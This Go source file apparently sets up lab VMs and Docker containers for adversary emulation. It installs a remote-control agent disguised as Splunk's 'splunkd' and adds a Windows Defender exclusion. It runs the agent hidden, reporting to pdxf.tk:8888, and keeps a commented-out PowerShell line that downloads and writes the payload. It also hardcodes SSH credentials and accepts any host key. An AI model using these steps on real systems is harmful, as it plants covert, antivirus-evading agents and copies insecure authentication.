package jctest

import (
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os/exec"
	"regexp"
	"time"

	"github.com/backend/makevm"
	"golang.org/x/crypto/ssh"
)

// get qemuip
func GetQemuIP(Domain string) string {
	MacAddress_temp := RtExcuteCMD("virsh", "dumpxml", Domain)
	r, _ := regexp.Compile("([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}")
	MacAddress := r.FindString(MacAddress_temp)
	// fmt.Println(MacAddress)
	IP_temp := RtExcuteCMD("sh", "-c", "arp -an | grep "+MacAddress)
	r1, _ := regexp.Compile(`(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)(\\.(25[0-5]|2[0-4]\\d|1\\d\\d|[1-9]?\\d)){3}`)
	IP_Real := r1.FindString(IP_temp)
	// fmt.Println(IP_Real)
	return IP_Real
}

// CMD 실행
func RtExcuteCMD(script string, arg ...string) string {
	cmd := exec.Command(script, arg...)
	output, err := cmd.CombinedOutput()
	if err != nil {
		fmt.Println(string(output))
		fmt.Println((err))
	} else {
		fmt.Println(string(output))
	}
	return string(output)
}

// 패스워드 전달 방식과 타임아웃 전역변수 설정
const (
	CertPassword      = 1 // Using Password
	CertPublicKeyFile = 2 // USing Public Key
	DefaultTimeout    = 3 // Second
)

// SSH 접속에 필요한 정보를 담는 생성자
type SSH struct {
	IP      string
	User    string
	Cert    string //password or key file path
	Port    int
	session *ssh.Session
	client  *ssh.Client
}

func (S *SSH) readPublicKeyFile(file string) ssh.AuthMethod {
	buffer, err := ioutil.ReadFile(file)
	if err != nil {
		return nil
	}

	key, err := ssh.ParsePrivateKey(buffer)
	if err != nil {
		return nil
	}
	return ssh.PublicKeys(key)
}

// Connect the SSH Server
func (S *SSH) Connect(mode int) {
	var sshConfig *ssh.ClientConfig
	var auth []ssh.AuthMethod
	if mode == CertPassword {
		auth = []ssh.AuthMethod{
			ssh.Password(S.Cert),
		}
	} else if mode == CertPublicKeyFile {
		auth = []ssh.AuthMethod{
			S.readPublicKeyFile(S.Cert),
		}
	} else {
		log.Println("does not support mode: ", mode)
		return
	}

	sshConfig = &ssh.ClientConfig{
		User: S.User,
		Auth: auth,
		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
			return nil
		},
		Timeout: time.Second * DefaultTimeout,
	}

	client, err := ssh.Dial("tcp", fmt.Sprintf("%s:%d", S.IP, S.Port), sshConfig)
	if err != nil {
		fmt.Println(err)
		return
	}

	session, err := client.NewSession()
	if err != nil {
		fmt.Println(err)
		client.Close()
		return
	}

	S.session = session
	S.client = client
}

// RunCmd to SSH Server
func (S *SSH) RunCmd(cmd string) {
	out, err := S.session.CombinedOutput(cmd)
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println(string(out))
}

// Close the SSH Server
func (S *SSH) Close() {
	S.session.Close()
	S.client.Close()
}

func Jctest(System string, VMname string, UserID string) {
	if System == "Windows" {
		Guser := "pdxf"
		Gpass := "pdxf"
		winip := GetQemuIP(VMname)
		fmt.Println(winip)
		client := &SSH{
			IP:   winip,
			User: Guser,
			Port: 22,
			Cert: Gpass,
		}
		//testip := makevm.RtExcuteCMD("whoami")
		//fmt.Println(testip)
		server := "http://pdxf.tk:8888"
		group := UserID
		address := "C:\\Users\\Public\\win_splunkd.exe"

		RtExcuteCMD("sh", "-c", "sshpass -p "+Gpass+" scp ..//user_windows/agent/win_splunkd.exe "+Guser+"@"+winip+":..//Public")

		client.Connect(CertPassword)
		client.RunCmd("powershell New-ItemProperty -Path 'HKLM:\\SOFTWARE\\OpenSSH' -Name DefaultShell -Value 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe' -PropertyType String -Force")
		//client.Connect(CertPassword)
		//client.RunCmd("$server=\"http://pdxf.tk:8888\"; $url=\"http://pdxf.tk:8888/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); get-process | ? {$_.modules.filename -like \"C:\\Users\\Public\\splunkd.exe\"} | stop-process -f; powershell rm -force \"C:\\Users\\Public\\splunkd.exe\" -ea ignore; [io.file]::WriteAllBytes(\"C:\\Users\\Public\\splunkd.exe\",$data) | Out-Null;")
		client.Connect(CertPassword)
		client.RunCmd("Set-MpPreference -ExclusionPath \"C:\\Users\\Public\\\"")
		fmt.Println("Start-Process -FilePath " + address + " -ArgumentList '-server " + server + " -group " + group + " -paw " + group + "'; sleep(3)")
		client.Connect(CertPassword)
		go client.RunCmd("Start-Process -FilePath " + address + " -ArgumentList '-server " + server + " -group " + group + " -paw " + group + "' -WindowStyle hidden -Wait")
	} else {
		dockerimagelist_rtn := makevm.Dockerimageps()
		Guser := VMname
		fmt.Println(dockerimagelist_rtn)
		fmt.Println(dockerimagelist_rtn)
		server := "http://pdxf.tk:8888"
		group := UserID
		RtExcuteCMD("sh", "-c", "docker exec "+Guser+" apt update")
		RtExcuteCMD("sh", "-c", "docker exec "+Guser+" apt install -y curl")
		RtExcuteCMD("sh", "-c", "docker cp ..//user_windows/agent/linux_splunkd "+Guser+":/")
		RtExcuteCMD("sh", "-c", "docker exec "+Guser+" chmod +x /linux_splunkd")
		RtExcuteCMD("sh", "-c", "docker exec "+Guser+" /linux_splunkd -server "+server+" -group "+group+" -paw "+group+" -v")
	}
}
